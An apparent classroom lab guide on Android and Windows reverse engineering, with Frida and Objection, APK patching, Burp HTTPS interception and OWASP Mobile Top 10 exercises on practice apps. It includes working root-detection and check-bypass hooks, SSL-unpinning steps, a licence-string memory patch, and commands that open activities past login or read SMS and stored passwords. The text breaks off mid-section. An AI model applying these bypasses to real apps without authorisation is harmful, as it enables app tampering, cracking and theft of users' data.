# Comprehensive Cybersecurity Lab Guide

## https://youtu.be/nXM1ZiTrPxs

### Android & Windows Reverse Engineering, Mobile Security Testing, Network Interception & Exploitation

**For Cybersecurity Department Students — Full Practical Lab with Own Systems & Metasploitable2**

---

## Table of Contents

1. [Lab Environment Setup](#1-lab-environment-setup)
2. [Frida Dynamic Instrumentation Toolkit](#2-frida-dynamic-instrumentation-toolkit)
3. [Android Emulator Setup (LD Player)](#3-android-emulator-setup-ld-player)
4. [ADB — Android Debug Bridge](#4-adb--android-debug-bridge)
5. [Frida Server on Android](#5-frida-server-on-android)
6. [Objection Framework](#6-objection-framework)
7. [APK Reverse Engineering Tools](#7-apk-reverse-engineering-tools)
8. [Frida Scripting — Core Concepts](#8-frida-scripting--core-concepts)
9. [Hooking & Runtime Manipulation](#9-hooking--runtime-manipulation)
10. [Root Detection Bypass](#10-root-detection-bypass)
11. [Windows Application Reverse Engineering](#11-windows-application-reverse-engineering)
12. [Non-Rooted Device Testing (APK Patching)](#12-non-rooted-device-testing-apk-patching)
13. [Network Traffic Interception with Burp Suite](#13-network-traffic-interception-with-burp-suite)
14. [HTTPS Interception & Certificate Pinning Bypass](#14-https-interception--certificate-pinning-bypass)
15. [OWASP Mobile Top 10 Vulnerabilities — Practical Labs](#15-owasp-mobile-top-10-vulnerabilities--practical-labs)
16. [Metasploitable2 Lab Extension](#16-metasploitable2-lab-extension)
17. [Testing Your Own Created Websites](#17-testing-your-own-created-websites)
18. [Ethical Hacking Methodology (Black / White / Gray Hat)](#18-ethical-hacking-methodology-black--white--gray-hat)
19. [Reference Commands Cheat Sheet](#19-reference-commands-cheat-sheet)

---

## 1. Lab Environment Setup

### 1.1 What You Need

| Component                    | Purpose                          | Free?     |
| ---------------------------- | -------------------------------- | --------- |
| LD Player (Android Emulator) | Rooted Android environment       | Yes       |
| Frida                        | Dynamic instrumentation          | Yes       |
| Objection                    | Mobile app audit framework       | Yes       |
| Android Studio               | Build tools & SDK                | Yes       |
| APKTool                      | Decompile/recompile APK          | Yes       |
| dex2jar                      | Convert APK → JAR                | Yes       |
| JD-GUI                       | Decompile JAR to Java source     | Yes       |
| Burp Suite Community         | HTTP/HTTPS proxy & interception  | Yes       |
| Python 3                     | Server scripting & tooling       | Yes       |
| Visual Studio Code           | Script editing                   | Yes       |
| Metasploitable2              | Vulnerable Linux VM for practice | Yes       |
| VirtualBox / VMware          | Run VMs                          | Free/Paid |

### 1.2 Host Machine Requirements

- Windows 10/11 (64-bit) recommended for this lab setup
- At least 8 GB RAM (16 GB preferred for running VMs simultaneously)
- 50 GB free disk space
- Virtualization enabled in BIOS (Intel VT-x / AMD-V)

### 1.3 Folder Structure (Recommended)

```
C:\CyberLab\
├── tools\               ← ADB, Frida server binary, APK tools
├── frida-scripts\       ← All your .js Frida scripts
├── android-projects\    ← Target APKs being analyzed
├── windows-projects\    ← Windows crackme targets
├── android-lab-server\  ← InsecureBank Python server
└── reports\             ← Your findings and notes
```

---

## 2. Frida Dynamic Instrumentation Toolkit

### 2.1 What is Frida?

Frida is a **dynamic instrumentation toolkit** used by developers, reverse engineers, and security researchers. It works on Windows, macOS, Linux, iOS, and Android.

**Core concept — the REPL (Read-Evaluate-Print Loop):**

- You inject JavaScript into a running process
- Hook any function, spy on crypto APIs, trace private code
- Inspect and **modify** parameters and return values **at runtime**
- No source code required; no compilation steps; instant feedback

**Key capabilities:**

- Hook any Java/native function in a running Android app
- Modify return values to bypass checks (root detection, license checks, etc.)
- Enumerate loaded classes, methods, properties
- Trace method calls and parameters in real time
- Works on both rooted devices (emulators) and non-rooted physical devices

### 2.2 Architecture Overview

```
┌─────────────────────────┐         ┌──────────────────────────────┐
│         Your PC         │         │      Android Device/Emulator  │
│                         │         │                               │
│  Frida Client (CLI)     │◄───────►│  Frida Server (background)   │
│  Objection Client       │  USB /  │         │                     │
│  Python Scripts         │  TCP    │         ▼                     │
│                         │         │   Target APK Process          │
│  [You write scripts     │         │   (hooks injected into        │
│   and send commands]    │         │    process memory)            │
└─────────────────────────┘         └──────────────────────────────┘
```

**Rooted Emulator flow:**

1. Push `frida-server` binary to `/data/local/tmp/`
2. Run it in the background with `&`
3. Connect from PC using Frida client commands

**Non-Rooted Physical Device flow:**

1. Patch target APK → embed `frida-gadget` inside APK
2. Rebuild and sign the APK
3. Install on device; app launches and exposes gadget as server
4. Connect Frida client from PC to the gadget

---

## 3. Android Emulator Setup (LD Player)

### 3.1 Why LD Player over Android Studio Emulator?

- Faster and more stable
- Better display quality
- Easier rooting
- Better ADB compatibility for security testing

### 3.2 Installation Steps

1. Download LD Player from official site
2. Scan with VirusTotal before running (false positives are normal for emulators)
3. Run installer → choose install path → install

### 3.3 Required Settings After Install

Open **Settings** in LD Player:

```
Settings → Other → Root (Enable)
Settings → Other → ADB Debugging → Open Local
```

Click **Restart Now** to apply.

**Why these settings matter:**

- **Root enabled** → gives you root shell via ADB, necessary to install/run Frida server
- **ADB Debugging** → allows your PC to connect and control the emulator

---

## 4. ADB — Android Debug Bridge

### 4.1 What is ADB?

ADB (Android Debug Bridge) is a command-line tool that lets you communicate with an Android device or emulator. It can:

- Transfer files
- Install/uninstall APKs
- Get shell access (including root shell on emulators)
- Run commands remotely on the device
- Capture logs

### 4.2 Installation

1. Download **Android SDK Platform Tools** (standalone, no need for full Android Studio)
2. Extract to a folder, e.g. `C:\CyberLab\tools\platform-tools\`
3. Add to PATH environment variable:
   - Search → "Edit environment variables" → Path → New → paste the folder path → OK

**Test the install:**

```bash
adb help
# Should display ADB help without "not recognized" error
```

### 4.3 Essential ADB Commands

```bash
# List connected devices and emulators
adb devices

# Open a shell on the default device
adb shell

# Open shell on a specific device (when multiple are connected)
adb -s emulator-5554 shell

# Check if you're root
id
whoami

# Install an APK
adb install target.apk

# Install to a specific device
adb -s emulator-5554 install target.apk

# Push a file to the device
adb push frida-server /data/local/tmp/

# Pull a file from the device
adb pull /sdcard/somefile.txt ./

# View real-time logs
adb logcat

# Clear logs
adb logcat -c

# Filter logs by keyword
adb logcat | findstr "username"     # Windows
adb logcat | grep "username"        # Linux/Mac

# Get CPU architecture (important for Frida server version)
adb shell getprop ro.product.cpu.abi

# Set global HTTP proxy (for Burp Suite)
adb shell settings put global http_proxy 192.168.1.100:8080

# Remove proxy
adb shell settings put global http_proxy :0

# Check running processes
adb shell ps
adb shell ps | grep frida-server

# Get device IP (if needed)
adb shell ip addr show wlan0
```

### 4.4 CPU Architecture Reference

```bash
adb shell getprop ro.product.cpu.abi
```

| Output        | Meaning                       | Frida server to use             |
| ------------- | ----------------------------- | ------------------------------- |
| `x86`         | Intel 32-bit (most emulators) | `frida-server-*-android-x86`    |
| `x86_64`      | Intel 64-bit                  | `frida-server-*-android-x86_64` |
| `armeabi-v7a` | ARM 32-bit (older phones)     | `frida-server-*-android-arm`    |
| `arm64-v8a`   | ARM 64-bit (modern phones)    | `frida-server-*-android-arm64`  |

---

## 5. Frida Server on Android

### 5.1 Download the Right Version

- Go to: `https://github.com/frida/frida/releases`
- Download matching your emulator/device architecture
- For LD Player (Intel emulator): `frida-server-{version}-android-x86.xz`

### 5.2 Install and Run Frida Server

```bash
# Step 1: Verify device is connected
adb devices

# Step 2: Push Frida server to world-writable temp directory
adb push frida-server /data/local/tmp/

# Step 3: Connect to device shell
adb shell

# Step 4: Navigate to temp folder
cd /data/local/tmp

# Step 5: Check permissions (should NOT have x yet)
ls -l

# Step 6: Make it executable
chmod +x frida-server

# Step 7: Run it in the background
./frida-server &

# Step 8: Confirm it's running
ps | grep frida-server
# OR
ps -e | grep frida
```

### 5.3 Troubleshooting Frida Server

```bash
# If it crashes — check if another instance is running
ps | grep frida
kill <PID>

# Re-run
./frida-server &
```

---

## 6. Objection Framework

### 6.1 What is Objection?

Objection is a runtime mobile exploration toolkit built on top of Frida. It provides:

- Built-in root/jailbreak detection bypass
- SSL pinning bypass
- File system exploration
- Memory search and dump
- Easy-to-use shell interface

Objection depends on the Frida client — installing objection installs Frida client automatically.

### 6.2 Prerequisites

**Python 3 is required.** Install Python 3:

1. Download from python.org
2. **Important:** Check "Add Python 3 to PATH" before clicking Install Now
3. Verify:

```bash
python -V
pip --version
```

### 6.3 Install Objection (and Frida client)

```bash
pip3 install -U objection
```

**Verify both are installed:**

```bash
frida --version
objection --version
```

### 6.4 Basic Objection Usage

```bash
# Connect to a running app (using package name)
objection --gadget com.example.app explore

# Connect with startup command (bypass root detection on launch)
objection --gadget com.example.app explore --startup-command "android root disable"

# Inside Objection shell — useful commands:
android root disable              # Bypass root detection
android ssl unpinning             # Bypass SSL certificate pinning
android hooking list classes      # List all loaded classes
android hooking list methods com.example.MyClass   # List methods in a class
android hooking watch class com.example.MyClass    # Watch all method calls
android hooking watch method 'com.example.MyClass.myMethod' --dump-args --dump-return
memory list modules               # List loaded modules/libraries
memory search --string "password" # Search memory for string
android intent launch_activity com.example.PostLoginActivity  # Launch exported activity
```

---

## 7. APK Reverse Engineering Tools

### 7.1 APKTool

APKTool disassembles APK files into Smali (Android assembly) and AndroidManifest.xml, then lets you rebuild them.

**Installation:**

1. Install Java (required): `java -version` to verify
2. Download APKTool wrapper script (`apktool.bat`) and `apktool.jar`
3. Place both in `C:\Windows\` or in your platform-tools folder (already in PATH)
4. Rename jar to `apktool.jar`

**Usage:**

```bash
# Decompile (disassemble) an APK
apktool d target.apk

# Rebuild (recompile) from folder
apktool b target-folder

# If you get errors with AAPT1, use AAPT2
apktool b target-folder --use-aapt2

# Decompile with specific output folder name
apktool d target.apk -o output-folder
```

**What you get after decompiling:**

```
target-folder/
├── AndroidManifest.xml    ← Permissions, exported components, activities
├── smali/                 ← Disassembled Dalvik bytecode (assembly-like)
├── res/                   ← Resources (layouts, strings, images)
└── original/              ← Original META-INF
```

**Smali** is Android's assembly language. Understanding it:

```smali
.class public Lcom/example/MainActivity;
.super Landroid/app/Activity;

.method protected onCreate(Landroid/os/Bundle;)V
    # This is where app startup code lives
    invoke-virtual {p0}, Lcom/example/MainActivity;->checkRoot()Z
    # Z = boolean return type
```

### 7.2 dex2jar

Converts `.apk` (which contains `.dex` — Dalvik Executable) to `.jar` for Java decompilation.

**Installation:**

1. Download dex2jar from GitHub releases
2. Extract; add folder to PATH

**Usage:**

```bash
# Convert APK to JAR
d2j-dex2jar target.apk

# Output: target-dex2jar.jar
```

### 7.3 JD-GUI (Java Decompiler GUI)

Opens JAR files and shows decompiled Java source code.

**Run:**

```bash
java -jar jd-gui.jar
# Then File → Open → select your .jar file
```

**The two-step decompilation process:**

```
target.apk → [dex2jar] → target.jar → [JD-GUI] → readable Java source
```

### 7.4 Understanding the Android Manifest

The manifest is the most important file for security analysis:

```xml
<!-- Exported activity (VULNERABILITY: can be launched without login) -->
<activity android:name=".PostLoginActivity" android:exported="true" />

<!-- Implicit export via intent-filter -->
<activity android:name=".LoginActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
    </intent-filter>
</activity>

<!-- Dangerous permissions -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.CAMERA" />

<!-- Network security config (can restrict HTTPS inspection) -->
<application android:networkSecurityConfig="@xml/network_security_config">
```

**Things to look for in the manifest:**

- `exported="true"` on any component → exploitable
- Intent filters on non-main activities → implicitly exported
- Dangerous permissions the app doesn't need
- `debuggable="true"` in production builds → major vulnerability
- `allowBackup="true"` → data can be extracted via ADB

---

## 8. Frida Scripting — Core Concepts

### 8.1 Script Structure (Always Start Here)

Every Frida script targeting Java (Android) starts with:

```javascript
Java.perform(function () {
  // All your hooking code goes here
  // This runs inside the target app's Java runtime
})
```

The `Java.perform()` ensures your code runs in the context of the app's Java VM.

### 8.2 Running Scripts

```bash
# Attach to running app by package name (app already running)
frida -U -f com.example.app -l yourscript.js

# Attach by app display name
frida -U -n "Hello App" -l yourscript.js

# Attach without pausing (no --pause, no resume needed)
frida -U -f com.example.app -l yourscript.js --no-pause

# List all running processes on device
frida-ps -U

# List with full package names
frida-ps -Uai

# Reload script while attached (inside Frida REPL)
%reload

# Run a script on already-running Frida session
%exec path/to/script.js
```

### 8.3 Script: Hello World

```javascript
// hello-world.js
Java.perform(function () {
  console.log('Hello from inside the app process!')
})
```

**Run:**

```bash
frida -U -f com.example.helloapp -l hello-world.js --no-pause
```

### 8.4 Script: Enumerate All Loaded Classes

```javascript
// list-classes.js
Java.perform(function () {
  Java.enumerateLoadedClasses({
    onMatch: function (name, handle) {
      // Filter to show only this app's classes (not Android framework)
      if (name.includes('com.example.helloapp')) {
        console.log(name)
      }
    },
    onComplete: function () {
      console.log('[*] Class enumeration complete.')
    },
  })
})
```

**Save output to file:**

```bash
frida -U -n "Hello App" -l list-classes.js > class-list.txt
```

### 8.5 Script: List Methods and Properties of a Class

```javascript
// list-methods-properties.js
Java.perform(function () {
  // Hook the target class
  const ActivityClass = Java.use('com.example.helloapp.MainActivity')

  // Get all own properties (methods + fields)
  const methods = Object.getOwnPropertyNames(ActivityClass)
  console.log(methods.join('\n'))
})
```

---

## 9. Hooking & Runtime Manipulation

### 9.1 What is Hooking?

Hooking means intercepting a function call **at runtime** and:

- Inspecting its parameters (before execution)
- Modifying its parameters
- Replacing its entire implementation
- Changing its return value

This is the most powerful technique in mobile security research.

### 9.2 Hook a Method — Basic Pattern

```javascript
Java.perform(function () {
  // Step 1: Get a reference to the class
  const TargetClass = Java.use('com.example.app.SomeClass')

  // Step 2: Override the method's implementation
  TargetClass.someMethod.implementation = function (param1, param2) {
    // Step 3: Log the parameters
    console.log('[*] someMethod called with: ' + param1 + ', ' + param2)

    // Step 4: Call the original method (optional)
    const originalResult = this.someMethod(param1, param2)
    console.log('[*] Original result: ' + originalResult)

    // Step 5: Return original or modified result
    return originalResult
    // OR return false; to bypass a check
    // OR return "modified_value";
  }
})
```

### 9.3 Hook with Overloaded Methods

When a method has multiple signatures (different parameter types):

```javascript
Java.perform(function () {
  const TargetClass = Java.use('com.example.app.CheckClass')

  // Hook the specific overload that takes a String parameter
  TargetClass.check.overload('java.lang.String').implementation = function (inputStr) {
    console.log('[*] Input string: ' + inputStr.toString())
    return true // Always return true (bypass)
  }

  // Hook overload with two parameters
  TargetClass.anotherMethod.overload('java.lang.String', 'int').implementation = function (s, n) {
    console.log('[*] Params: ' + s + ', ' + n)
    return this.anotherMethod(s, n) // call original
  }
})
```

### 9.4 Dump Method Parameters (Practical Example)

```javascript
// dump-params.js — Intercept a verification function and dump what user types
Java.perform(function () {
  const CheckClass = Java.use('owasp.mstg.uncrackable1.a')

  CheckClass.a.overload('java.lang.String').implementation = function (userInput) {
    console.log('[*] User entered: ' + userInput)

    // Force return true so any input is "correct"
    return true
  }
})
```

### 9.5 Decrypt and Reveal Hidden Secrets

When an app stores encrypted passwords, you can call the decryption functions yourself:

```javascript
// decrypt-show.js
Java.perform(function () {
  // Step 1: Wrap Android's Base64 class
  const Base64 = Java.use('android.util.Base64')

  // Step 2: Wrap the app's decryption class
  const DecryptClass = Java.use('sg.vantagepoint.a.a')

  // Step 3: Wrap the key generation function
  const KeyClass = Java.use('sg.vantagepoint.uncrackable1.a')

  // Step 4: Wrap Java's String class
  const StringClass = Java.use('java.lang.String')

  // Step 5: Replicate the decryption algorithm from decompiled code
  // Decode the base64-encoded ciphertext
  const cipherBytes = Base64.decode('5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc=', 0)

  // Get the encryption key (using app's own key function)
  const encKey = KeyClass.b('8d127684cbc37c17616d806cf50473cc')

  // Decrypt using the app's own decryption function
  const decryptedBytes = DecryptClass.a(encKey, cipherBytes)

  // Convert byte array to readable string
  const password = StringClass.$new(decryptedBytes)
  console.log('[*] Secret password: ' + password)
})
```

---

## 10. Root Detection Bypass

### 10.1 What is Root Detection?

Apps (especially banking, financial, enterprise) check if the device is rooted and refuse to run. This is a security control to prevent reverse engineering.

**Common root detection checks:**

1. Check for known root-related files (`/system/app/Superuser.apk`, `/sbin/su`, `/system/bin/su`)
2. Check for root management apps (Magisk, SuperSU)
3. Check if `/system` is writable
4. Check `build.tags` for `test-keys`
5. Run `which su` command
6. Check installed packages list for root apps

### 10.2 Bypass Method 1: Manual Frida Script

After decompiling the app and identifying the root check functions:

```javascript
// root-bypass.js
Java.perform(function () {
  // Hook the class containing root check functions
  const RootCheckClass = Java.use('sg.vantagepoint.a.c')

  // Override function A (file-based root check)
  RootCheckClass.a.implementation = function () {
    console.log('[*] Bypassed root check A')
    return false // No root detected
  }

  // Override function B (build tags check)
  RootCheckClass.b.implementation = function () {
    console.log('[*] Bypassed root check B')
    return false
  }

  // Override function C (su binary check)
  RootCheckClass.c.implementation = function () {
    console.log('[*] Bypassed root check C')
    return false
  }
})
```

**Run:**

```bash
frida -U -f owasp.mstg.uncrackable1 -l root-bypass.js
# When paused, type: %resume
```

### 10.3 Bypass Method 2: Objection (Easiest)

Objection has built-in bypass for common root detection patterns:

```bash
# Method A: Bypass on startup
objection --gadget owasp.mstg.uncrackable1 explore --startup-command "android root disable"

# Method B: Two-terminal technique (for timing issues)
# Terminal 1 — Start app in paused state:
frida -U -f owasp.mstg.uncrackable1
# Don't resume yet!

# Terminal 2 — Inject bypass:
objection --gadget owasp.mstg.uncrackable1 explore --startup-command "android root disable"

# Back to Terminal 1 — Resume:
%resume
```

### 10.4 Why the Two-Terminal Technique?

Sometimes the root check runs so fast that objection can't inject before the check completes. The solution:

1. Use Frida to start the app in a **suspended/paused state**
2. Use Objection to inject the bypass hooks while paused
3. Then resume — bypass is already in place when checks run

---

## 11. Windows Application Reverse Engineering

### 11.1 Frida on Windows

The same Frida concepts apply to Windows executables. The difference: instead of Java methods, you hook **native functions** (C/C++ Windows API calls).

```bash
# Run a Windows app through Frida
frida -f "C:\path\to\crackme.exe" -l your-script.js --no-pause
```

### 11.2 Script: List All Loaded Modules (DLLs)

```javascript
// list-modules.js
var modules = Process.enumerateModules()
modules.forEach(function (module) {
  console.log(module.name)
})
```

This shows all DLLs loaded by the process. Useful for identifying which Windows API functions are available to hook.

### 11.3 Script: List All Imported Functions

```javascript
// list-functions.js
var mod = Module.load('crackme2.exe')
var functions = mod.enumerateImports()
functions.forEach(function (f) {
  console.log(f.name + ' from ' + f.module)
})
```

**Why this matters:** You can see which Windows API functions the app calls. If you see `CreateFileA`, `RegOpenKey`, `MessageBoxA`, etc., you know what to hook.

### 11.4 Hook Windows API: MessageBoxA

`MessageBoxA` is the Windows API for showing dialog boxes. Hooking it lets you see every message the app displays (and change them).

```javascript
// hook-messagebox.js
// Find the address of MessageBoxA in user32.dll
const msgboxAddr = Module.findExportByName('user32.dll', 'MessageBoxA')
console.log('[*] MessageBoxA address: ' + msgboxAddr)

// Attach an interceptor to that address
Interceptor.attach(msgboxAddr, {
  onEnter: function (args) {
    console.log('[*] Entered MessageBoxA')

    // args[0] = hWnd (window handle, usually NULL)
    // args[1] = lpText (the message text)
    // args[2] = lpCaption (the title/caption)
    // args[3] = uType (buttons and icon type)

    console.log('    Text:    ' + args[1].readUtf8String())
    console.log('    Caption: ' + args[2].readUtf8String())
  },
  onLeave: function (retval) {
    console.log('[*] Exited MessageBoxA, return value: ' + retval)
  },
})
```

> **Note:** `MessageBoxA` = ANSI (UTF-8). `MessageBoxW` = Unicode (UTF-16).
> For `MessageBoxW`, use `args[1].readUtf16String()`.

### 11.5 Modify MessageBox Text at Runtime

```javascript
// modify-messagebox.js
const user32 = Module.getExportByName('user32.dll', 'MessageBoxA')

// Allocate new strings in process memory
const newText = Memory.allocUtf8String('CONGRATULATIONS! You cracked it!')
const newCaption = Memory.allocUtf8String('SUCCESS')

Interceptor.attach(user32, {
  onEnter: function (args) {
    // Print original values before modifying
    console.log('[*] Original text: ' + args[1].readUtf8String())
    console.log('[*] Original caption: ' + args[2].readUtf8String())

    // Replace with our custom strings
    args[1] = newText
    args[2] = newCaption

    // Change icon to Information icon (value 0x40)
    args[3] = ptr(0x40)
  },
})
```

### 11.6 Hook CreateFileA (Find What File an App Reads)

```javascript
// hook-createfile.js
const createFileAddr = Module.getExportByName('kernel32.dll', 'CreateFileA')

Interceptor.attach(createFileAddr, {
  onEnter: function (args) {
    const filename = args[0].readUtf8String()
    const desiredAccess = args[1].toInt32()

    console.log('[*] CreateFileA called')
    console.log('    File: ' + filename)
    console.log('    Access mode: 0x' + desiredAccess.toString(16))

    // 0x80000000 = GENERIC_READ
    // 0x40000000 = GENERIC_WRITE
    // 0x8 = FILE_READ_ATTRIBUTES
  },
  onLeave: function (retval) {
    // -1 (0xFFFFFFFF) means INVALID_HANDLE_VALUE = file not found
    console.log(
      '    Handle: ' + retval + (retval.toInt32() === -1 ? ' (FILE NOT FOUND)' : ' (SUCCESS)'),
    )
  },
})
```

### 11.7 Memory Scanning for Strings

Find and modify specific strings in process memory at runtime:

```javascript
// scan-strings.js
// Convert target string to hex first (use online tool: string-to-hex)
// "Registered to" → hex pattern

const targetHex = '526567697374657265642074' // "Registered t..." in hex

// Get all readable+writable memory ranges
const ranges = Process.enumerateRanges('rw-')

ranges.forEach(function (range) {
  try {
    Memory.scan(range.base, range.size, targetHex, {
      onMatch: function (address, size) {
        console.log('[*] Found at: ' + address)
        console.log('    Current: ' + address.readUtf8String())

        // Overwrite with new string
        address.writeUtf8String('Registered to CrackingLessons.com')
        console.log('    New value: ' + address.readUtf8String())
      },
      onComplete: function () {
        console.log('[*] Scan complete')
      },
      onError: function (reason) {
        // Memory access error — skip this range silently
      },
    })
  } catch (e) {}
})
```

---

## 12. Non-Rooted Device Testing (APK Patching)

When working with a real physical Android device that is **not rooted**, you cannot install Frida server directly. Instead, you embed the Frida gadget into the target APK.

### 12.1 Workflow Overview

```
Original APK → [Objection patch] → Modified APK (with Frida gadget inside)
→ Sign the APK → Install on device → Run → Connect Frida client
```

### 12.2 Step 1: Determine Device Architecture

```bash
adb shell getprop ro.product.cpu.abi
# Example output: arm64-v8a
```

### 12.3 Step 2: Enable Developer Mode on Device

On the Android phone:

1. Settings → About Phone → Software Information
2. Tap **Build Number** 7 times
3. Developer mode is now enabled
4. Go back → Settings → Developer Options
5. Enable **USB Debugging**
6. Connect via USB → Accept debugging prompt on phone

### 12.4 Step 3: Patch the APK

```bash
# Basic patch
objection patchapk --source target.apk -a arm64-v8a

# If you get an error, use AAPT2
objection patchapk --source target.apk -a arm64-v8a --use-aapt2

# Output: target.objection.apk (this contains the embedded Frida gadget)
```

### 12.5 Step 4: Sign the Patched APK

APKs must be signed before installation. Create a keystore:

```bash
# Create keystore
keytool -genkey -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000
# Follow prompts: password (remember it), press Enter for name/org fields, type "yes" to confirm

# Sign the APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore target.objection.apk my-key-alias
# Enter keystore password when prompted
```

### 12.6 Step 5: Install and Connect

```bash
# Verify device is connected
adb devices

# Install patched APK
adb install target.objection.apk

# Run the app manually on phone — it will start in SUSPENDED state (white screen)

# List processes to find gadget
frida-ps -Uai | grep gadget

# Connect to gadget
frida -U -n Gadget -l your-script.js
# Or:
frida -U Gadget
# App resumes and you get a Frida session
```

---

## 13. Network Traffic Interception with Burp Suite

### 13.1 What is Burp Suite?

Burp Suite is an HTTP/HTTPS proxy used to:

- Intercept and modify web requests from apps
- Replay requests with modified parameters
- Scan for vulnerabilities
- View hidden API calls

### 13.2 Installation

1. Download Burp Suite Community Edition (free)
2. Run installer
3. On first launch: accept license, click "Start Burp"

### 13.3 Configure Burp to Listen on All Interfaces

```
Burp → Proxy → Options → Edit (127.0.0.1:8080)
→ Binding: All interfaces
→ Port: 8080
→ OK → Yes
```

### 13.4 Configure Android Emulator to Use Burp Proxy

**Step 1:** Find your PC's LAN IP:

```bash
ipconfig   # Windows
# Look for: Wireless LAN adapter Wi-Fi → IPv4 Address
# Example: 192.168.1.100
```

**Step 2:** Verify emulator can reach your PC:

```bash
adb shell
ping -c 3 192.168.1.100
# Should see replies
```

**Step 3:** Set emulator proxy to Burp:

```bash
adb shell settings put global http_proxy 192.168.1.100:8080
```

**Step 4:** Turn on Burp intercept:

```
Burp → Proxy → Intercept → Intercept is ON
```

**Step 5:** Browse on emulator — traffic appears in Burp.

**To disable proxy:**

```bash
adb shell settings put global http_proxy :0
```

### 13.5 Using Burp Effectively

```
Proxy → HTTP History   ← See all requests (even with intercept off)
Proxy → Intercept      ← Stop and modify individual requests
Repeater               ← Replay/modify requests manually
Intruder               ← Automated attack (brute force, fuzzing)
Decoder                ← Encode/decode base64, URL, etc.
```

---

## 14. HTTPS Interception & Certificate Pinning Bypass

### 14.1 Why HTTPS Fails by Default

Apps using HTTPS validate the server certificate. Burp Suite uses its own certificate (which is not trusted by default), so HTTPS connections fail with a certificate error.

**Two levels of defense:**

1. **System CA validation** — app trusts Android's system certificate store (bypassable by installing Burp cert)
2. **Certificate Pinning** — app has hardcoded cert fingerprint, ignores system store (harder to bypass)

### 14.2 Bypass Level 1: Install Burp Certificate

**Export Burp certificate:**

```
Burp → Proxy → Options → Import/export CA certificate → Export → Certificate in DER format
→ Save to a shared folder accessible from emulator
```

**Install in Android emulator:**

```
Settings → Wi-Fi → ⋮ → Advanced → Install certificates
→ Navigate to the certificate file → Select it
→ Name it "BurpCA" → OK
→ Set up PIN if prompted (e.g., 1234)
```

**Test:** Open Chrome on emulator → go to an HTTPS site → it should load → Burp shows the traffic.

### 14.3 Bypass Level 2: Certificate Pinning via APK Modification

If the app still rejects Burp even after installing the CA cert, it has certificate pinning.

**Solution: Patch the network security config**

**Step 1:** Decompile the APK:

```bash
apktool d target.apk -o target-decompiled
```

**Step 2:** Check AndroidManifest.xml for:

```xml
android:networkSecurityConfig="@xml/network_security_config"
```

**Step 3:** Open `res/xml/network_security_config.xml` and replace contents with:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <!-- Trust pre-installed CAs -->
            <certificates src="system" />
            <!-- Trust user-installed CAs (includes Burp cert) -->
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

**Step 4:** Rebuild and sign:

```bash
apktool b target-decompiled --use-aapt2 -o target-patched.apk
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore target-patched.apk my-key-alias
adb install target-patched.apk
```

**Step 5:** Now Burp can intercept HTTPS traffic from the app.

### 14.4 Bypass Level 3: SSL Pinning via Objection/Frida

If the app pins certs in code (not via config file):

```bash
# Inside Objection shell
android ssl unpinning

# Or via startup command
objection --gadget com.example.app explore --startup-command "android ssl unpinning"
```

---

## 15. OWASP Mobile Top 10 Vulnerabilities — Practical Labs

### 15.1 M1: Improper Platform Usage

**Vulnerability:** Misuse of exported components (Activities, Services, Receivers, Content Providers).

**Lab — Exploit Exported Activity:**

```bash
# Decompile app and look for exported="true" in manifest
apktool d insecurebank.apk

# Find exported activities
grep -r "exported" insecurebank/AndroidManifest.xml

# Launch exported activity directly, bypassing login
adb shell am start -n "com.android.insecurebankv2/.PostLoginActivity"
# -n = component name (package/activity)
```

**Exploit exported content provider (SMS data):**

```bash
adb shell content query --uri content://sms/inbox
# This reads the SMS inbox via the content provider without any auth
```

**Defend against it:**

```xml
<!-- In AndroidManifest.xml -->
<activity android:name=".PostLoginActivity" android:exported="false" />
```

### 15.2 M2: Insecure Data Storage

**Vulnerability:** Apps store sensitive data unencrypted in shared preferences, databases, or external storage.

**Lab — Read Shared Preferences:**

```bash
adb shell
cd /data/data/com.android.insecurebankv2/shared_prefs/
ls
cat MySharedPreferences.xml
# You'll see: encrypted_username, super_secure_password — stored in plaintext!
```

**Lab — Query SQLite Database:**

```bash
adb shell
cd /data/data/com.android.insecurebankv2/databases/
ls
sqlite3 mydb
.tables
SELECT * FROM names;
.quit
```

**Lab — Check external storage:**

```bash
adb shell
ls /sdcard/
ls /sdcard/Android/data/com.example.app/
```

**Defend against it:**

- Use Android Keystore for sensitive data
- Use `EncryptedSharedPreferences` instead of regular SharedPreferences
- Never store passwords or tokens in plaintext

### 15.3 M3: Insecure Communication

**Vulnerability:** App sends sensitive data over unencrypted HTTP or with weak/pinned certs.

**Lab — Intercept login credentials via Burp:**

1. Set up Burp proxy on emulator
2. Log into InsecureBank app
3. Capture the login request in Burp
4. See username and password in HTTP POST body in **plaintext**

**What to look for in intercepted traffic:**

```
POST /login HTTP/1.1
Host: 192.168.1.100:8888

username=Jack&password=Jack%40123%24
```

### 15.4 M4: Insecure Authentication

**Vulnerability:** Weak session management, easily bypassable authentication.

**Lab:**

- Use Burp to capture a login session token
- Modify the token to see if you can access other accounts
- Use Frida to force-return `true` from any authentication function

### 15.5 M5: Insufficient Cryptography

**Vulnerability:** App uses weak encryption (MD5, DES, ECB mode), hardcoded keys, or stores encrypted data with the key nearby.

**Lab — Find hardcoded key in decompiled code:**

```bash
# After dex2jar + JD-GUI, search for:
# "secret", "key", "password", "AES", "DES", "MD5"
# Look for hardcoded byte arrays near encryption functions
```

**Example of what you'll find:**

```java
private static final byte[] SECRET_KEY = {8, -3, -73, ...};
```

**Frida script to extract the key at runtime (as shown in decrypt-show.js above)**

### 15.6 M9: Reverse Engineering

**Vulnerability:** App code is not obfuscated and can be easily decompiled.

**Lab — Full decompile pipeline:**

```bash
# Step 1: Convert APK to JAR
d2j-dex2jar target.apk

# Step 2: Open in JD-GUI
java -jar jd-gui.jar
# File → Open → target-dex2jar.jar
# Browse all classes and read the Java source
```

### 15.7 M10: Extraneous Functionality

**Vulnerability:** Debug endpoints, test credentials, hidden admin features left in production.

**Lab — Find hidden features:**

```bash
# Search for debug flags in decompiled code
grep -r "debug" . --include="*.smali"
grep -r "test" . --include="*.smali"

# Look for hidden activities in manifest
